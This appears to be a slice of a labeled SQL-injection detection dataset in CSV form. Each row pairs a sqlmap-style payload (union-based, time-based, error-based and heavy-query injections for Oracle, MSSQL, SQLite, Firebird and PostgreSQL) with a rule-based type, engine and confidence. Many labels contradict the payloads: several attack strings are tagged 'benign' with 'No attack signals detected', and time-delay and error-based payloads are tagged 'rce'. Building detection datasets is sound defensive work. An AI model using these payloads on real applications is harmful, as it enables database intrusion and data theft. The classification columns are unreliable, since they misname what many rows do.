row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
2880,"1' ) ) ) union all select null,null,null#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
2881,"waitfor delay '0:0:5' and ( ( ( ""mfro"" like ""mfro",1,,time_blind,mssql,0.95,waitfor delay is MSSQL-specific time-delay function — time-based blind inference (priority 5),rule-based
2882,1 ) ) as zpvn where 2767 = 2767 rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) --,1,,boolean_blind,generic,0.95,rlike  detected — boolean_blind injection (priority 8) on generic,rule-based
2883,"-4964"" ) ) union all select 4750,4750,4750,4750,4750--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
2884,"1%' and elt ( 4249 = 4249,7259 ) and '%' = '",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
2885,1 ) ) as ehlg where 6340 = 6340,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
2886,"1, ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4250 = 4250 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual )",1,,error_based,oracle,0.95,xmltype ( detected — error_based injection (priority 4) on oracle,rule-based
2887,"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ( 'qfsu' = 'qfsu",1,,rce,generic,0.95,0x4c4d6142 detected — rce injection (priority 1) on generic,rule-based
2888,"select count ( * ) from generate_series ( 1,5000000 ) and ( ( ( ""%"" = """,1,,heavy_query,generic,0.95,"generate_series (, select count ( * ) from generate_series ( 1,5000000 detected — heavy_query injection (priority 6) on generic",rule-based
2889,"1%"" ) ) ) and 3116 = 9088#",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
2890,1' ) ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( 'opyp' = 'opyp,1,,error_based,oracle,0.95,xmltype ( detected — error_based injection (priority 4) on oracle,rule-based
2891,"1%' ) or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( '%' = '",1,,heavy_query,firebird,0.95,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb detected — heavy_query injection (priority 6) on firebird",rule-based
2892,"1 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) -- pvdw",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
2893,"1 ) as rtpl where 1262 = 1262 and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1,,time_blind,sqlite,0.95,randomblob ( is SQLite-specific time-delay function — time-based blind inference (priority 5),rule-based
2894,"1%' ) union all select null,null,null--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
2895,"1 ) ) as rpwt where 4103 = 4103 and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,,heavy_query,generic,0.95,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain detected — heavy_query injection (priority 6) on generic",rule-based
2896,-4108' ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( 'tqjx' = 'tqjx,1,,boolean_blind,postgresql,0.95,) and ( detected — boolean_blind injection (priority 8) on postgresql,rule-based
2897,"1"" ) ) as itxo where 7916 = 7916",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
2898,"1 ) ) or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
2899,"1 where 5081 = 5081 or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) --",1,,boolean_blind,generic,0.95,5081 = 5081 or detected — boolean_blind injection (priority 8) on generic,rule-based
2900,1'+ ( select 'unpz' where 8186 = 8186,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
2901,"-5124'+ ( select 'xpww' where 1752 = 1752 union all select 1752,1752,1752,1752,1752,1752,1752,1752,1752,1752--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
2902,"1"" ) where 9461 = 9461 union all select null,null,null,null,null,null,null,null,null#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
2903,1 ) as hvsk where 7902 = 7902,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
2904,1' ) as bscn where 6907 = 6907,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
2905,-7453' ) ) ) or 8571 = 8571--,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
2906,1' where 2134 = 2134 rlike ( select ( case when ( 3613 = 2090 ) then 1 else 0x28 end ) ) --,1,,boolean_blind,generic,0.95,rlike  detected — boolean_blind injection (priority 8) on generic,rule-based
2907,"1"" ) ) as vxkn where 2443 = 2443 or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,,heavy_query,generic,0.95,"select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers detected — heavy_query injection (priority 6) on generic",rule-based
2908,select ( case when ( 5009 = 1133 ) then 5009 else 5009* ( select 5009 from information_schema.character_sets ) end ) #,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
2909,"1 ) ) ) or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and ( ( ( 1782 = 1782",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
